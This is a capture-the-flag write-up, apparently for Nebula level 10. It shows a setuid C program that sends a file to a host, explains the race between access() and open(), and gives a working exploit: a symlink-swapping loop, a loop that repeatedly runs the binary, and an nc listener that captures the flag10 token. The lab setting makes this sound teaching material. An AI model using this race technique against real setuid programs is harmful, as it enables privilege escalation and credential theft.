# level 10

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```

This is a [time to check to time of use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
vulnerability. In this case the function access use the real UID (this is your
ID) while the open use the effective UID (this is the ID by who is running the
process). In this case if we see the output of "ls -hal /home/flag10" we will
see that the real UID is "level10", while the effective UID is "flag10" for the
file flag10.

in this case we need to create a link to file that is owned by level10 than
before the function open is called we need to change the link to point to the
file "token".

```bash
touch /home/level10/token
while :
do 
    ln -fs /home/level10/test /tmp/token;
    ln -fs /home/flag10/token /tmp/token;
done
```

In another terminal run:

```bash
while :
do
    /home/flag10/flag10 /tmp/token 127.0.0.1;
done
```

And in another one run:

```bash
nc -lk 18211
```

At some point when the first while will change after the acces and before the
open in the flag10 program, we will see on netcat the content of the file token.
Now we can use it as password to login as flag10 and run getflag.
